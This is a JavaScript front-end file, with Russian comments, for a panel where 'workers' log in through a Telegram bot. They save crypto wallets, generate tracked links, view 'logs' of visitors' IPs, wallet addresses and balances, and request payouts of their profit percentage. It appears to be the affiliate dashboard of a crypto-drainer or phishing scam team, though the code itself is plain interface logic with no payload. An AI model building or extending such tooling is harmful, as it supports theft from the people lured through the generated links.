// Переключение вкладок
document.querySelectorAll('.nav-link').forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        const tabId = link.getAttribute('data-tab');
        
        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
        link.classList.add('active');
        
        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
        document.getElementById(tabId).classList.add('active');
        
        if (tabId === 'logs') loadLogs();
        if (tabId === 'links') loadLinks();
        if (tabId === 'withdrawals') loadWithdrawals();
    });
});

// Авторизация по коду из URL / бота
const urlParams = new URLSearchParams(window.location.search);
const authCode = urlParams.get('code');
if (authCode) {
    fetch('api/auth.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code: authCode })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            localStorage.setItem('user', JSON.stringify(data.user));
            loadUserProfile();
        } else {
            alert('Неверный или просроченный код');
        }
    });
} else {
    // Проверяем, есть ли уже сохраненный пользователь
    const saved = localStorage.getItem('user');
    if (saved) {
        loadUserProfile();
    } else {
        alert('Для доступа к панели авторизуйтесь через Telegram бота');
    }
}

function loadUserProfile() {
    fetch('api/get_user.php')
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                document.getElementById('profileName').innerText = data.user.username || 'Воркер';
                document.getElementById('profileStatus').innerHTML = `Статус: ${data.user.status}`;
                document.getElementById('profileBalance').innerText = `${data.user.balance} $`;
                document.getElementById('profileTotalProfit').innerText = `${data.user.total_profit} $`;
                document.getElementById('profilePercent').innerText = `${data.user.percent}%`;
                // заполняем реквизиты
                if (data.user.wallets) {
                    document.getElementById('trc20').value = data.user.wallets.trc20 || '';
                    document.getElementById('erc20').value = data.user.wallets.erc20 || '';
                    document.getElementById('bep20').value = data.user.wallets.bep20 || '';
                    document.getElementById('ton').value = data.user.wallets.ton || '';
                }
            }
        });
}

// Генерация ссылки
document.getElementById('generateLinkBtn')?.addEventListener('click', () => {
    fetch('api/generate_link.php', { method: 'POST' })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                document.getElementById('generatedLink').value = data.link;
                document.getElementById('linkModal').style.display = 'flex';
            } else {
                alert(data.error || 'Ошибка: заполните реквизиты в профиле');
            }
        });
});

document.querySelector('.close-modal')?.addEventListener('click', () => {
    document.getElementById('linkModal').style.display = 'none';
});

document.getElementById('copyLinkBtn')?.addEventListener('click', () => {
    const input = document.getElementById('generatedLink');
    input.select();
    document.execCommand('copy');
    alert('Ссылка скопирована');
});

// Логи
function loadLogs() {
    fetch('api/get_logs.php')
        .then(res => res.json())
        .then(data => {
            const tbody = document.getElementById('logsTableBody');
            if (!data.logs || data.logs.length === 0) {
                tbody.innerHTML = '<tr><td colspan="6" class="loading-row">Нет событий</td></tr>';
                return;
            }
            tbody.innerHTML = data.logs.map(log => `
                <tr>
                    <td>${log.date}</td>
                    <td>${log.type}</td>
                    <td>${log.ip || '—'}</td>
                    <td>${log.address ? log.address.slice(0,8)+'...' : '—'}</td>
                    <td>${log.balance ? log.balance + ' $' : '—'}</td>
                    <td><button class="detail-btn" data-id="${log.id}"><i class="fas fa-chevron-right"></i></button></td>
                </tr>
            `).join('');
        });
}

document.getElementById('refreshLogsBtn')?.addEventListener('click', loadLogs);

// Сохранение реквизитов
document.getElementById('walletsForm')?.addEventListener('submit', (e) => {
    e.preventDefault();
    const wallets = {
        trc20: document.getElementById('trc20').value,
        erc20: document.getElementById('erc20').value,
        bep20: document.getElementById('bep20').value,
        ton: document.getElementById('ton').value
    };
    fetch('api/save_wallets.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(wallets)
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) alert('Реквизиты сохранены');
        else alert('Ошибка сохранения');
    });
});

// Выплаты
function loadWithdrawals() {
    fetch('api/get_withdrawals.php')
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById('withdrawalsList');
            if (!data.withdrawals || data.withdrawals.length === 0) {
                container.innerHTML = '<div class="empty-state">Нет заявок на вывод</div>';
                return;
            }
            container.innerHTML = data.withdrawals.map(w => `
                <div class="withdrawal-card">
                    <div class="w-info"><span>Сумма: ${w.amount} $</span><span>Процент: ${w.percent}%</span><span>Статус: ${w.status}</span></div>
                    <button class="request-btn" data-id="${w.id}">Создать заявку на вывод</button>
                </div>
            `).join('');
        });
}

// Ссылки воркера
function loadLinks() {
    fetch('api/get_links.php')
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById('linksList');
            if (!data.links || data.links.length === 0) {
                container.innerHTML = '<div class="empty-state">Нет сгенерированных ссылок</div>';
                return;
            }
            container.innerHTML = data.links.map(link => `
                <div class="link-card">
                    <span>${link.url}</span>
                    <span>Создана: ${link.date}</span>
                    <span>Переходов: ${link.clicks}</span>
                </div>
            `).join('');
        });
}

// Иконка телеграма (канал)
document.getElementById('telegramLink')?.addEventListener('click', (e) => {
    e.preventDefault();
    window.open('https://t.me/ваш_канал', '_blank');
});